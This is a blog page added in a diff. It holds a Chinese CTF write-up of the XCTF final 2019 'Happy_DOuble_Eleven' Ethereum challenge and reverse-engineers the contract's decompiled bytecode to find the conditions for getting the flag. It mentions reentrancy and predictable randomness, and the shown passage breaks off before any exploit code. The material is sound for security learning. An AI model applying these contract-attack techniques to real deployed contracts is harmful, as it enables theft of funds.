@@ -1,0 +1,649 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/default.png">
+  <link rel="icon" href="/img/default.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="KKfine&#39;s blog">
+  <meta name="keywords" content="">
+  
+  <title>Ethereum Storage(3)-XCTF_final 2019 Happy_DOuble_Eleven - KKfine&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/atelier-estuary-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>KKfine's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/5.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Ethereum Storage(3)-XCTF_final 2019 Happy_DOuble_Eleven">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-09-02 12:46" pubdate>
+        2022年9月2日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      6.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      100
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Ethereum Storage(3)-XCTF_final 2019 Happy_DOuble_Eleven</h1>
+            
+            <div class="markdown-body">
+              <h1 id="XCTF-final-2019-Happy-DOuble-Eleven"><a href="#XCTF-final-2019-Happy-DOuble-Eleven" class="headerlink" title="XCTF_final 2019 Happy_DOuble_Eleven"></a>XCTF_final 2019 Happy_DOuble_Eleven</h1><p>[toc]</p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/blockchain/ethereum/storage/">wiki</a>上推荐的题目。但感觉放在初学的那一节内容得看很久，尤其是关于evm逆向的相关知识，感觉这题复现完也有点蒙蒙的。</p>
+<p><a target="_blank" rel="noopener" href="https://hitcxy.com/2019/Happy-DOuble-Eleven/">参考wp</a></p>
+<p>本次复现得合约地址为0xcCaECd49e4Ea39C536291193E9301dF4d5E0A654<br>攻击账户0x90641D6c0691829Dd70C39EE10EA44B26ac8C5AE</p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>照着wiki上Ethereum Storage推荐的题目做的，但感觉梯度有点直接太高了，涉及了很多其它攻击，一共学合约就没几天哈哈哈逆向给看麻了，但还是学到了挺多。</p>
+<h3 id="关于重入攻击"><a href="#关于重入攻击" class="headerlink" title="关于重入攻击"></a>关于重入攻击</h3><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/blockchain/ethereum/attacks/re-entrancy/">wiki重入攻击</a></p>
+<h3 id="关于随机数预测"><a href="#关于随机数预测" class="headerlink" title="关于随机数预测"></a>关于随机数预测</h3><p>这题中涉及到了利用区块号生成的随机数是可预测的。<br><a target="_blank" rel="noopener" href="https://www.chainpip.com/article/452/142">参考文章1</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5614">参考文章2</a><br><a target="_blank" rel="noopener" href="https://ctf-wiki.org/blockchain/ethereum/attacks/randomness/">wiki部分</a></p>
+<h3 id="关于msg-data"><a href="#关于msg-data" class="headerlink" title="关于msg.data"></a>关于msg.data</h3><p>msg.data是什么，就是完整的calldata，那calldata又是什么呢，我理解就是调用函数时包含的参数函数签名等等所有的数据。<br>可以参考这个<a target="_blank" rel="noopener" href="https://qa.1r1g.cn/ethereum/ask/982621/">例子</a>，这个函数需要5个参数，然后返回msg.data</p>
+<figure class="highlight zephir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs zephir"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getMsgData</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  address _address,</span></span><br><span class="hljs-function"><span class="hljs-params">  bytes _bytes,</span></span><br><span class="hljs-function"><span class="hljs-params">  <span class="hljs-keyword">uint</span> _int,</span></span><br><span class="hljs-function"><span class="hljs-params">  <span class="hljs-keyword">uint</span>[] _array,</span></span><br><span class="hljs-function"><span class="hljs-params">  <span class="hljs-keyword">string</span> _string</span></span><br><span class="hljs-function"><span class="hljs-params"> )</span></span><br><span class="hljs-function">  <span class="hljs-title">external</span></span><br><span class="hljs-function">  <span class="hljs-title">returns</span> <span class="hljs-params">(bytes)</span></span><br><span class="hljs-function"> </span>&#123;<br>   <span class="hljs-keyword">return</span> msg.data;<br> &#125;<br></code></pre></div></td></tr></table></figure>
+<p>然后使用以下方式调用函数</p>
+<figure class="highlight csharp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs csharp">contract.getMsgData(<br> someAddress,<br> web3.toHex(<span class="hljs-string">&#x27;my bytes&#x27;</span>),<br> <span class="hljs-number">12</span>,<br> [<span class="hljs-meta">1, 4, 412</span>],<br> <span class="hljs-string">&#x27;thisislargerthanthirtytwobytesstring&#x27;</span><br>);<br></code></pre></div></td></tr></table></figure>
+<p>最后返回的msg.data是这样的，可以看到第一行是调用的函数签名，后面一次是函数需要的参数值。其实这样来看的话就是理解abi了就行了。</p>
+<figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-number">0</span>xd1621754 // (<span class="hljs-number">1</span>) methodId<br><span class="hljs-number">000000000000000000000000</span>c6e012db5298275a4c11b3e07d2caba88473fce1 // (<span class="hljs-number">2</span>) <span class="hljs-string">&quot;_address&quot;</span><br><span class="hljs-number">00000000000000000000000000000000000000000000000000000000000000</span>a0 // (<span class="hljs-number">3</span>) location of start of <span class="hljs-string">&quot;_bytes&quot;</span> <span class="hljs-keyword">data</span> (item <span class="hljs-number">7</span>) = <span class="hljs-number">160</span> bytes<br><span class="hljs-number">000000000000000000000000000000000000000000000000000000000000000</span>c // (<span class="hljs-number">4</span>) <span class="hljs-string">&quot;_val&quot;</span> = <span class="hljs-number">12</span><br><span class="hljs-number">00000000000000000000000000000000000000000000000000000000000000e0</span> // (<span class="hljs-number">5</span>) location of start of <span class="hljs-string">&quot;_array&quot;</span> <span class="hljs-keyword">data</span> (item <span class="hljs-number">9</span>) = <span class="hljs-number">224</span> bytes<br><span class="hljs-symbol">0000000000000000000000000000000000000000000000000000000000000160 </span>// (<span class="hljs-number">6</span>) location of start of <span class="hljs-string">&quot;_string&quot;</span> <span class="hljs-keyword">data</span> (item <span class="hljs-number">13</span>) = <span class="hljs-number">352</span> bytes<br><span class="hljs-symbol">0000000000000000000000000000000000000000000000000000000000000008 </span>// (<span class="hljs-number">7</span>) size of <span class="hljs-string">&quot;_bytes&quot;</span> <span class="hljs-keyword">data</span> in bytes (<span class="hljs-number">32</span> bytes)<br><span class="hljs-number">6d79206279746573000000000000000000000000000000000000000000000000</span> // (<span class="hljs-number">8</span>) <span class="hljs-string">&quot;_bytes&quot;</span> <span class="hljs-keyword">data</span> padded <span class="hljs-keyword">to</span> <span class="hljs-number">32</span> bytes<br><span class="hljs-symbol">0000000000000000000000000000000000000000000000000000000000000003 </span>// (<span class="hljs-number">9</span>) length of <span class="hljs-string">&quot;_array&quot;</span> <span class="hljs-keyword">data</span> = <span class="hljs-number">3</span><br><span class="hljs-symbol">0000000000000000000000000000000000000000000000000000000000000001 </span>// (<span class="hljs-number">10</span>) _array[<span class="hljs-number">0</span>] value = <span class="hljs-number">1</span><br><span class="hljs-symbol">0000000000000000000000000000000000000000000000000000000000000004 </span>// (<span class="hljs-number">11</span>) _array[<span class="hljs-number">2</span>] value = <span class="hljs-number">4</span><br><span class="hljs-number">000000000000000000000000000000000000000000000000000000000000019</span>c // (<span class="hljs-number">12</span>) _array[<span class="hljs-number">3</span>] value = <span class="hljs-number">412</span><br><span class="hljs-symbol">0000000000000000000000000000000000000000000000000000000000000024 </span>// (<span class="hljs-number">13</span>) size of <span class="hljs-string">&quot;_string&quot;</span> <span class="hljs-keyword">data</span> in bytes (<span class="hljs-number">64</span> bytes)<br><span class="hljs-number">7468697369736</span>c61726765727468616e74686972747974776f6279746573737472696e670..<span class="hljs-number">0</span> // (<span class="hljs-number">14</span>) <span class="hljs-string">&quot;_string&quot;</span> <span class="hljs-keyword">data</span> padded <span class="hljs-keyword">to</span> <span class="hljs-number">64</span> bytes<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>合约地址0x7D43878EFBF99C6B5B0eb288026B1d48588C1793</p>
+<p>合约反编译出来有这些函数。<br><img src="https://img-blog.csdnimg.cn/img_convert/a99867c55e40643914b60783a51a5239.png" srcset="/img/loading.gif" lazyload></p>
+<p>反汇编出来最开始的那一段是这样的。<br><img src="https://img-blog.csdnimg.cn/img_convert/068b9e3539aee35eef72205b2f40c8b3.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs p">contract Contract &#123;<br>    function main() &#123;<br>    #进入main函数，把0x80写到[0x40 ,0x40 + 0x20]这块内存里面,因为内存是空的,这会创建新的内存<br> 		#对应的opcode操作<br> 		#PUSH1 0x80 <br> 		#PUSH1 0x40 <br> 		#MSTORE  即为  MSTORE(arg0, arg1)从栈中获取两个参数，表示MEM[0x40:(0x40+32)&#x3D;0x60] &#x3D; 0x80。<br> 		#正在做的是分配96个字节的存储器并将指针移动到第64个字节的开头。 我们现在有64个字节用于临时空间，32个字节用于临时存储器存储。<br> #可靠性文档声明如下：&quot;Solidity以一种非常简单的方式管理内存：内存中位置0x40有一个&quot;空闲内存指针&quot;。如果你想分配内存，只需使用该点的内存并相应地更新指针。&quot;<br>     #其实还是没太看明白这里在干啥也许就像re里面的初始化空间吧。<br>        memory[0x40:0x60] &#x3D; 0x80;<br>    <br>    # 判断用户输入的data内容长度是否小于4，如果满足就revert（关于revert,assert,require的比较）<br>    #其实就是判断是否是正确的调用函数的字节数，因为调用函数需要使用其前四字节，如果小于就明显不对。<br>        if (msg.data.length &lt; 0x04) &#123; revert(memory[0x00:0x00]); &#125;<br>    <br>    #与上0xffffffff（即四字节）获取data的低4位，赋值给var0，其实就是取函数签名，前四个字节（函数签名四个字节表示为0xffffffff类型） ，<br>    #EVM里对函数的调用都是取bytes4(keccak256(函数名(参数类型1,参数类型2))传递的，即对函数签名做keccak256哈希后取前4字节<br>        var var0 &#x3D; msg.data[0x00:0x20] &#x2F; 0x0100000000000000000000000000000000000000000000000000000000 &amp; 0xffffffff;<br><br>然后利用var0来判断调用哪个函数<br></code></pre></div></td></tr></table></figure>
+
+
+<h3 id="0x6bc344bc-payforflag-string"><a href="#0x6bc344bc-payforflag-string" class="headerlink" title="0x6bc344bc payforflag(string)"></a>0x6bc344bc payforflag(string)</h3><p>因为第一次逆向合约，是对着源码一起看的，反编译代码和注释分析如下。<br>首先看调用payforflag的地方,这里我看了挺久的也问了一些大佬,2333evm逆向真不比re简单啊。</p>
+<p>这里就涉及到了msg.data我们看看直接调用这个函数的完整calldata。很容易看懂，string类型是边长的，所以第一个byte32就是string的offset 0x20（函数就一个参数）。然后第二个就是string的长度0x06，最后一个就是string值了。<br><img src="https://img-blog.csdnimg.cn/img_convert/f91a50dd56096f4010c788b47f70f8fe.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以这里temp2就是offset了然后还得加上函数签名的四字节，temp3获取到string的长度，但是temp4不是从msg.data里面取值了，temp4是空闲内存指针的值</p>
+<p>然后对于中间那三个memory的操作，首先可以看懂这篇<a target="_blank" rel="noopener" href="https://icode.best/i/72240947133769">文章</a>，sodility文档内联汇编部分也讲了。</p>
+<ul>
+<li><p>所以<code>memory[0x40:0x60] = temp4 + (temp3 + 0x1f) / 0x20 * 0x20 + 0x20;</code>就是在计算空闲内存指针实际指向的位置，然后放入，memory[0x40:0x60]中，memory[0x40:0x60]就类似于一个入口点的样子。</p>
+</li>
+<li><p>计算出空闲内存指针实际位置之后，就开始从这个新地址分配内存来存放一些函数需要使用的参数临时数据。例如这里最先存储的是temp3即string长度</p>
+</li>
+<li><p>然后将string参数的值放到了memory[temp4 + 0x20:temp4 + 0x20 + temp3]</p>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs p">else if (var0 &#x3D;&#x3D; 0x6bc344bc) &#123;<br>            &#x2F;&#x2F; Dispatch table entry for payforflag(string)<br>            var1 &#x3D; msg.value;<br>            <br>            if (var1) &#123; revert(memory[0x00:0x00]); &#125;<br>            <br>            var1 &#x3D; 0x0282;<br>            var temp2 &#x3D; msg.data[0x04:0x24] + 0x04;<br>            var temp3 &#x3D; msg.data[temp2:temp2 + 0x20];<br>            var temp4 &#x3D; memory[0x40:0x60];<br>            memory[0x40:0x60] &#x3D; temp4 + (temp3 + 0x1f) &#x2F; 0x20 * 0x20 + 0x20;<br>            memory[temp4:temp4 + 0x20] &#x3D; temp3;<br>            memory[temp4 + 0x20:temp4 + 0x20 + temp3] &#x3D; msg.data[temp2 + 0x20:temp2 + 0x20 + temp3];<br>            var2 &#x3D; temp4;<br>            payforflag(var2);<br>            stop();<br></code></pre></div></td></tr></table></figure>
+<p>函数里面有几个要求</p>
+</li>
+<li><p>要求 msg.sender == storage[0x00]（所以最开始肯定定义了address public owner这种，并且这里大概率使用了onlyOwner来修饰这个函数）</p>
+</li>
+<li><p>要求 msg.sender 后三12位为 0x111</p>
+</li>
+<li><p>要求 storage[0x06] == 0x03</p>
+</li>
+<li><p>要求 storage[0x05] &gt; 0x8ac7230489e80000 （感觉这种就能判断为mapping类型并且大概率类似mapping (address =&gt; uint)）</p>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs p">function payforflag(var arg0) &#123;<br>        &#x2F;&#x2F;其实就是用了onlyOwner来修饰函数，等价于语句require(msg.sender &#x3D;&#x3D; owner)<br>        if (msg.sender !&#x3D; storage[0x00] &amp; 0xffffffffffffffffffffffffffffffffffffffff) &#123; revert(memory[0x00:0x00]); &#125;<br>    <br>        &#x2F;&#x2F;需要调用合约的账户后三位是0x111<br>        if (msg.sender &amp; 0x0fff !&#x3D; 0x0111) &#123; revert(memory[0x00:0x00]); &#125;<br>    <br>        &#x2F;&#x2F;0x06即slot7 ，说明前面还定义了一些变量<br>        memory[0x00:0x20] &#x3D; msg.sender;<br>        memory[0x20:0x40] &#x3D; 0x06;<br>        <br>        &#x2F;&#x2F;类似于keccak256(abi.encodePacked(k, p))，这里很明显是一个mapping类型变量<br>        &#x2F;&#x2F;读取值然后要求  level[msg.sender] &#x3D;&#x3D; 3(level是变量名这里是看了源码写的，下面的变量名同)<br>        if (storage[keccak256(memory[0x00:0x40])] !&#x3D; 0x03) &#123; revert(memory[0x00:0x00]); &#125;<br>    <br>        &#x2F;&#x2F;0x05 即 slot6 ，也是一个mapping类型<br>        memory[0x00:0x20] &#x3D; msg.sender;<br>        memory[0x20:0x40] &#x3D; 0x05;<br>        <br>        &#x2F;&#x2F;要求 mycart[msg.sender] &gt; 10000000000000000000<br>        if (storage[keccak256(memory[0x00:0x40])] &lt;&#x3D; 0x8ac7230489e80000) &#123; revert(memory[0x00:0x00]); &#125;<br>    <br>        &#x2F;&#x2F;将storage[0x04]赋值为0x00，<br>        memory[0x00:0x20] &#x3D; msg.sender;<br>        memory[0x20:0x40] &#x3D; 0x04;<br>        storage[keccak256(memory[0x00:0x40])] &#x3D; 0x00;<br>        <br>        &#x2F;&#x2F;将storage[0x06]赋值为0x00，即level[msg.sender] &#x3D; 0<br>        memory[0x00:0x20] &#x3D; msg.sender;<br>        memory[0x20:0x40] &#x3D; 0x06;<br>        storage[keccak256(memory[0x00:0x40])] &#x3D; 0x00;<br>        <br>&#x2F;&#x2F;storage[0x02] 最后个字节赋值为0，这里也能看出这是一个单字节变量，这里有可能是个bool型，<br>&#x2F;&#x2F;但是也可能是个变长型变量例如动态数组等，这里存储的是长度，从源码可以看到这里是对应一个bool型变量。<br>        storage[0x02] &#x3D; (storage[0x02] &amp; ~0xff) | 0x00;<br>        <br>        <br>        &#x2F;&#x2F;0xff * 0x0100 ** 0x14)&#x3D;0xff0000000000000000000000000000000000000000 <br>        &#x2F;&#x2F;算得的结果是21字节，所以大概率第一个字节是个bool型，后面二十字节是一个address类型值<br>        &#x2F;&#x2F;所以这里就是将storage[0x00]第一个字节赋值为0x00<br>        storage[0x00] &#x3D; (storage[0x00] &amp; ~(0xff * 0x0100 ** 0x14)) | 0x00;<br>        <br>        <br>        var var0 &#x3D; 0x00;<br>        var var1 &#x3D; 0x0eed;<br>        var var2 &#x3D; 0x01;<br>        var var3 &#x3D; var0;<br>        func_1489(var2, var3);<br>        var0 &#x3D; 0x296b9274d26b7baffb5cc93e1af19012c35ace27ba9acf1badff99d1f76dfa69;<br>        var temp0 &#x3D; arg0;<br>        var1 &#x3D; temp0;<br>        var temp1 &#x3D; memory[0x40:0x60];<br>        var2 &#x3D; temp1;<br>        var3 &#x3D; var2;<br>        var temp2 &#x3D; var3 + 0x20;<br>        memory[var3:var3 + 0x20] &#x3D; temp2 - var3;<br>        memory[temp2:temp2 + 0x20] &#x3D; memory[var1:var1 + 0x20];<br>        var var4 &#x3D; temp2 + 0x20;<br>        var var6 &#x3D; memory[var1:var1 + 0x20];<br>        var var5 &#x3D; var1 + 0x20;<br>        var var7 &#x3D; var6;<br>        var var8 &#x3D; var4;<br>        var var9 &#x3D; var5;<br>        var var10 &#x3D; 0x00;<br>    <br>        if (var10 &gt;&#x3D; var7) &#123;<br>        label_0F50:<br>            var temp3 &#x3D; var6;<br>            var4 &#x3D; temp3 + var4;<br>            var5 &#x3D; temp3 &amp; 0x1f;<br>        <br>            if (!var5) &#123;<br>                var temp4 &#x3D; memory[0x40:0x60];<br>                log(memory[temp4:temp4 + var4 - temp4], [stack[-6]]);<br>                return;<br>            &#125; else &#123;<br>                var temp5 &#x3D; var5;<br>                var temp6 &#x3D; var4 - temp5;<br>                memory[temp6:temp6 + 0x20] &#x3D; ~(0x0100 ** (0x20 - temp5) - 0x01) &amp; memory[temp6:temp6 + 0x20];<br>                var temp7 &#x3D; memory[0x40:0x60];<br>                log(memory[temp7:temp7 + (temp6 + 0x20) - temp7], [stack[-6]]);<br>                return;<br>            &#125;<br>        &#125; else &#123;<br>        label_0F3E:<br>            var temp8 &#x3D; var10;<br>            memory[var8 + temp8:var8 + temp8 + 0x20] &#x3D; memory[var9 + temp8:var9 + temp8 + 0x20];<br>            var10 &#x3D; temp8 + 0x20;<br>        <br>            if (var10 &gt;&#x3D; var7) &#123; goto label_0F50; &#125;<br>            else &#123; goto label_0F3E; &#125;<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure></li>
+</ul>
+<h3 id="0xed21248c-Deposit"><a href="#0xed21248c-Deposit" class="headerlink" title="0xed21248c Deposit()"></a>0xed21248c Deposit()</h3><p>调用Deposit函数倒没啥，因为没有传参，所以直接调用即可，</p>
+<figure class="highlight gcode"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gcode">&#125; else <span class="hljs-keyword">if</span> <span class="hljs-comment">(var0 == 0xed21248c)</span> &#123;<br>    <span class="hljs-comment">// Dispatch table entry for Deposit()</span><br>    var<span class="hljs-number">1</span> = <span class="hljs-number">0</span>x<span class="hljs-number">050</span>c;<br>    Deposit<span class="hljs-comment">()</span>;<br>    stop<span class="hljs-comment">()</span>;<br></code></pre></div></td></tr></table></figure>
+<p>函数分析。</p>
+<ul>
+<li><p>首先需要msg.value &gt;= 500000000000000000000 wei 即 500eth，然后slot[0x05]  + 0x01.</p>
+</li>
+<li><p>结合 payforflag 来看，这个操作不现实，因为 payforflag 中要求 storage[0x05] &gt; 0x8ac7230489e80000 ，即要将 msg.value &gt;= 500 eth 进行 0x8ac7230489e80000+1 次</p>
